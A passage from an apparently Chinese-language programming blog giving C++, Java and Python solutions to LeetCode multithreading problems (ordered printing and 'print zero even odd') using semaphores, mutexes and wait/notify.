href="#解法一：信号量" class="headerlink" title="解法一：信号量"></a>解法一：信号量</h3><p>使用自带锁的<strong>信号量</strong>（<strong>Semaphore</strong>）可以很方便地实现我们的功能，各大语言的标准库都提供有自己的标准信号量的实现</p><p>因为只需要保证<code>second()</code>和<code>third()</code>方法在<code>first()</code>方法之后执行即可，故不需要为<code>first()</code>方法上锁</p><p>大致执行过程如下：</p><ul><li>为<code>second()</code>和<code>third()</code>设置两个信号量s2，s3，置为0</li><li>执行<code>first()</code>方法时解锁s2</li><li>执行<code>second()</code>方法时先等待s2解锁，在最后锁上s2并解锁s3</li><li>执行<code>third()</code>方法时先等待s3解锁，在最后锁上s3</li></ul><p>构造代码如下：</p><h4 id="C-版"><a href="#C-版" class="headerlink" title="C++版"></a>C++版</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">sem_t</span> sem_pthread_2, sem_pthread_3;</span><br><span class="line">    Foo() </span><br><span class="line">    &#123;</span><br><span class="line">        sem_init(&amp;sem_pthread_2,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        sem_init(&amp;sem_pthread_3,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">first</span><span class="params">(function&lt;<span class="keyword">void</span>()&gt; printFirst)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;    </span><br><span class="line">        <span class="comment">// printFirst() outputs "first". Do not change or remove this line.</span></span><br><span class="line">        printFirst();</span><br><span class="line">        sem_post(&amp;sem_pthread_2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">second</span><span class="params">(function&lt;<span class="keyword">void</span>()&gt; printSecond)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        sem_wait(&amp;sem_pthread_2);    </span><br><span class="line">        <span class="comment">// printSecond() outputs "second". Do not change or remove this line.</span></span><br><span class="line">        printSecond();</span><br><span class="line">        sem_post(&amp;sem_pthread_3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">third</span><span class="params">(function&lt;<span class="keyword">void</span>()&gt; printThird)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        sem_wait(&amp;sem_pthread_3);    </span><br><span class="line">        <span class="comment">// printThird() outputs "third". Do not change or remove this line.</span></span><br><span class="line">        printThird();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/02/ywsX3tVlv1M8zGO.png" alt="image.png"></p><h4 id="Java版"><a href="#Java版" class="headerlink" title="Java版"></a>Java版</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    Semaphore sem_thread_2,sem_thread_3;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Foo</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        sem_thread_2 = <span class="keyword">new</span> Semaphore(<span class="number">0</span>);</span><br><span class="line">        sem_thread_3 = <span class="keyword">new</span> Semaphore(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">first</span><span class="params">(Runnable printFirst)</span> <span class="keyword">throws</span> InterruptedException </span></span><br><span class="line"><span class="function">    </span>&#123;        </span><br><span class="line">        <span class="comment">// printFirst.run() outputs "first". Do not change or remove this line.</span></span><br><span class="line">        printFirst.run();</span><br><span class="line">        sem_thread_2.release();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">second</span><span class="params">(Runnable printSecond)</span> <span class="keyword">throws</span> InterruptedException </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        sem_thread_2.acquire();</span><br><span class="line">        <span class="comment">// printSecond.run() outputs "second". Do not change or remove this line.</span></span><br><span class="line">        printSecond.run();</span><br><span class="line">        sem_thread_3.release();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">third</span><span class="params">(Runnable printThird)</span> <span class="keyword">throws</span> InterruptedException </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        sem_thread_3.acquire();    </span><br><span class="line">        <span class="comment">// printThird.run() outputs "third". Do not change or remove this line.</span></span><br><span class="line">        printThird.run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/02/jZB2YJQikrSmGs6.png" alt="image.png"></p><blockquote><p>在多线程上Java的速度似乎比C++快好多呢</p></blockquote><h4 id="Python版"><a href="#Python版" class="headerlink" title="Python版"></a>Python版</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Semaphore</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.sem_thread_s2 = Semaphore(<span class="number">0</span>)</span><br><span class="line">        self.sem_thread_s3 = Semaphore(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">first</span><span class="params">(self, printFirst: <span class="string">'Callable[[], None]'</span>)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">        <span class="comment"># printFirst() outputs "first". Do not change or remove this line.</span></span><br><span class="line">        printFirst()</span><br><span class="line">        self.sem_thread_s2.release()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">second</span><span class="params">(self, printSecond: <span class="string">'Callable[[], None]'</span>)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">        self.sem_thread_s2.acquire()</span><br><span class="line">        <span class="comment"># printSecond() outputs "second". Do not change or remove this line.</span></span><br><span class="line">        printSecond()</span><br><span class="line">        self.sem_thread_s3.release()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">third</span><span class="params">(self, printThird: <span class="string">'Callable[[], None]'</span>)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">        self.sem_thread_s3.acquire()</span><br><span class="line">        <span class="comment"># printThird() outputs "third". Do not change or remove this line.</span></span><br><span class="line">        printThird()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/02/d5j9Aw8FbolXHZ1.png" alt="image.png"></p><h3 id="解法二：互斥锁"><a href="#解法二：互斥锁" class="headerlink" title="解法二：互斥锁"></a>解法二：互斥锁</h3><p>和解法一的思路其实是类似的</p><p>构造代码如下：</p><h4 id="C-版-1"><a href="#C-版-1" class="headerlink" title="C++版"></a>C++版</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mutex&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">std</span>::mutex lock_2, lock_3;</span><br><span class="line">    Foo() </span><br><span class="line">    &#123;</span><br><span class="line">        lock_2.lock();</span><br><span class="line">        lock_3.lock();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">first</span><span class="params">(function&lt;<span class="keyword">void</span>()&gt; printFirst)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;    </span><br><span class="line">        <span class="comment">// printFirst() outputs "first". Do not change or remove this line.</span></span><br><span class="line">        printFirst();</span><br><span class="line">        lock_2.unlock();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">second</span><span class="params">(function&lt;<span class="keyword">void</span>()&gt; printSecond)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        lock_2.lock();    </span><br><span class="line">        <span class="comment">// printSecond() outputs "second". Do not change or remove this line.</span></span><br><span class="line">        printSecond();</span><br><span class="line">        lock_3.unlock();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">third</span><span class="params">(function&lt;<span class="keyword">void</span>()&gt; printThird)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        lock_3.lock();</span><br><span class="line">        <span class="comment">// printThird() outputs "third". Do not change or remove this line.</span></span><br><span class="line">        printThird();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/02/I92dekCg5LE14Wm.png" alt="image.png"></p><h4 id="Java版-1"><a href="#Java版-1" class="headerlink" title="Java版"></a>Java版</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> first_finished, second_finished;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Foo</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        first_finished = <span class="keyword">false</span>;</span><br><span class="line">        second_finished = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">first</span><span class="params">(Runnable printFirst)</span> <span class="keyword">throws</span> InterruptedException </span></span><br><span class="line"><span class="function">    </span>&#123;        </span><br><span class="line">        <span class="comment">// printFirst.run() outputs "first". Do not change or remove this line.</span></span><br><span class="line">        <span class="keyword">synchronized</span>(<span class="keyword">this</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            printFirst.run();</span><br><span class="line">            first_finished = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">this</span>.notifyAll();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">second</span><span class="params">(Runnable printSecond)</span> <span class="keyword">throws</span> InterruptedException </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span>(<span class="keyword">this</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span>(!first_finished)</span><br><span class="line">                <span class="keyword">this</span>.wait();</span><br><span class="line">            first_finished = <span class="keyword">false</span>;</span><br><span class="line">            printSecond.run();</span><br><span class="line">            second_finished = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">this</span>.notifyAll();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// printSecond.run() outputs "second". Do not change or remove this line.</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">third</span><span class="params">(Runnable printThird)</span> <span class="keyword">throws</span> InterruptedException </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span>(<span class="keyword">this</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span>(!second_finished)</span><br><span class="line">                wait();</span><br><span class="line">            second_finished = <span class="keyword">false</span>;</span><br><span class="line">            printThird.run();</span><br><span class="line">            notifyAll();</span><br><span class="line">        &#125;   </span><br><span class="line">        <span class="comment">// printThird.run() outputs "third". Do not change or remove this line.</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/02/IKUN2ePcZErvWkh.png" alt="image.png"></p><h4 id="Python版-1"><a href="#Python版-1" class="headerlink" title="Python版"></a>Python版</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Lock</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.lock_s2 = Lock()</span><br><span class="line">        self.lock_s3 = Lock()</span><br><span class="line">        self.lock_s2.acquire()</span><br><span class="line">        self.lock_s3.acquire()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">first</span><span class="params">(self, printFirst: <span class="string">'Callable[[], None]'</span>)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">        <span class="comment"># printFirst() outputs "first". Do not change or remove this line.</span></span><br><span class="line">        printFirst()</span><br><span class="line">        self.lock_s2.release()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">second</span><span class="params">(self, printSecond: <span class="string">'Callable[[], None]'</span>)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">        self.lock_s2.acquire()</span><br><span class="line">        <span class="comment"># printSecond() outputs "second". Do not change or remove this line.</span></span><br><span class="line">        printSecond()</span><br><span class="line">        self.lock_s3.release()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">third</span><span class="params">(self, printThird: <span class="string">'Callable[[], None]'</span>)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">        self.lock_s3.acquire()</span><br><span class="line">        <span class="comment"># printThird() outputs "third". Do not change or remove this line.</span></span><br><span class="line">        printThird()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/02/n9yMJ8Bks5OFhYp.png" alt="GUBN_FI1CF7RB06CDLJLJV2.png"></p><h1 id="0x01-中等"><a href="#0x01-中等" class="headerlink" title="0x01.中等"></a>0x01.中等</h1><h2 id="0x00-打印零与奇偶数"><a href="#0x00-打印零与奇偶数" class="headerlink" title="0x00.打印零与奇偶数"></a>0x00.<a href="https://leetcode-cn.com/problems/print-zero-even-odd/" target="_blank" rel="noopener">打印零与奇偶数</a></h2><blockquote><p>假设有这么一个类：</p><p>class ZeroEvenOdd {<br>  public ZeroEvenOdd(int n) { … }      // 构造函数<br>  public void zero(printNumber) { … }  // 仅打印出 0<br>  public void even(printNumber) { … }  // 仅打印出 偶数<br>  public void odd(printNumber) { … }   // 仅打印出 奇数<br>}<br>相同的一个 ZeroEvenOdd 类实例将会传递给三个不同的线程：</p><p>线程 A 将调用 zero()，它只输出 0 。<br>线程 B 将调用 even()，它只输出偶数。<br>线程 C 将调用 odd()，它只输出奇数。<br>每个线程都有一个 printNumber 方法来输出一个整数。请修改给出的代码以输出整数序列 010203040506… ，其中序列的长度必须为 2n。</p><p>示例 1：</p><p>输入：n = 2<br>输出：”0102”<br>说明：三条线程异步执行，其中一个调用 zero()，另一个线程调用 even()，最后一个线程调用odd()。正确的输出为 “0102”。<br>示例 2：</p><p>输入：n = 5<br>输出：”0102030405”</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/print-zero-even-odd" target="_blank" rel="noopener">https://leetcode-cn.com/problems/print-zero-even-odd</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><h3 id="解法一：信号量-1"><a href="#解法一：信号量-1" class="headerlink" title="解法一：信号量"></a>解法一：信号量</h3><p>依然可以使用信号量来解决这个问题</p><p>需要注意的是数字<code>0</code>是需要第一个被打印的，故打印<code>0</code>的线程的<strong>初始信号量应当设为1</strong></p><h4 id="C-版-2"><a href="#C-版-2" class="headerlink" title="C++版"></a>C++版</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include &lt;semaphore.h&gt;</span><br><span class="line">class ZeroEvenOdd </span><br><span class="line">&#123;</span><br><span class="line">private:</span><br><span class="line">    int n, count &#x3D; 0;</span><br><span class="line">    sem_t sem_zero, sem_even, sem_odd;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">    ZeroEvenOdd(int n) </span><br><span class="line">    &#123;</span><br><span class="line">        this-&gt;n &#x3D; n;</span><br><span class="line">        sem_init(&amp;sem_zero,0,1);</span><br><span class="line">        sem_init(&amp;sem_even,0,0);</span><br><span class="line">        sem_init(&amp;sem_odd,0,0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; printNumber(x) outputs &quot;x&quot;, where x is an integer.</span><br><span class="line">    void zero(function&lt;void(int)&gt; printNumber) </span><br><span class="line">    &#123;</span><br><span class="line">        for(int i&#x3D;0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            sem_wait(&amp;sem_zero);</span><br><span class="line">            printNumber(0);</span><br><span class="line">            if(i % 2)</span><br><span class="line">                sem_post(&amp;sem_even);</span><br><span class="line">            else</span><br><span class="line">                sem_post(&amp;sem_odd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void even(function&lt;void(int)&gt; printNumber) </span><br><span class="line">    &#123;</span><br><span class="line">        for(int i&#x3D;2;i&lt;&#x3D;n;i+&#x3D;2)</span><br><span class="line">        &#123;</span><br><span class="line">            sem_wait(&amp;sem_even);</span><br><span class="line">            printNumber(i);</span><br><span class="line">            sem_post(&amp;sem_zero);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void odd(function&lt;void(int)&gt; printNumber) </span><br><span class="line">    &#123;</span><br><span class="line">        for(int i&#x3D;1;i&lt;&#x3D;n;i+&#x3D;2)</span><br><span class="line">        &#123;</span><br><span class="line">            sem_wait(&amp;sem_odd);</span><br><span class="line">            printNumber(i);</span><br><span class="line">            sem_post(&amp;sem_zero);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/02/DLtsGHlIywMAgWi.png" alt="image.png"></p><h4 id="Java版-2"><a href="#Java版-2" class="headerlink" title="Java版"></a>Java版</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.concurrent.Semaphore;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ZeroEvenOdd</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    Semaphore sem_even, sem_odd, sem_zero;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ZeroEvenOdd</span><span class="params">(<span class="keyword">int</span> n)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        sem_zero = <span class="keyword">new</span> Semaphore(<span class="number">1</span>);</span><br><span class="line">        sem_even = <span class="keyword">new</span> Semaphore(<span class="number">0</span>);</span><br><span class="line">        sem_odd = <span class="keyword">new</span> Semaphore(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">this</span>.n = n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printNumber.accept(x) outputs "x", where x is an integer.</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">zero</span><span class="params">(IntConsumer printNumber)</span> <span class="keyword">throws</span> InterruptedException </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            sem_zero.acquire();</span><br><span class="line">            printNumber.accept(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">2</span> != <span class="number">0</span>)</span><br><span class="line">                sem_even.release();</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                sem_odd.release();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">even</span><span class="params">(IntConsumer printNumber)</span> <span class="keyword">throws</span> InterruptedException </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i+=<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sem_even.acquire();</span><br><span class="line">            printNumber.accept(i);</span><br><span class="line">            sem_zero.release();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">odd</span><span class="params">(IntConsumer printNumber)</span> <span class="keyword">throws</span> InterruptedException </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i+=<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sem_odd.acquire();</span><br><span class="line">            printNumber.accept(i);</span><br><span class="line">            sem_zero.release();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/04/8IYZ7FcrdK4LQlw.png" alt="image.png"></p><h4 id="Python版-2"><a href="#Python版-2" class="headerlink" title="Python版"></a>Python版</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Semaphore</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span 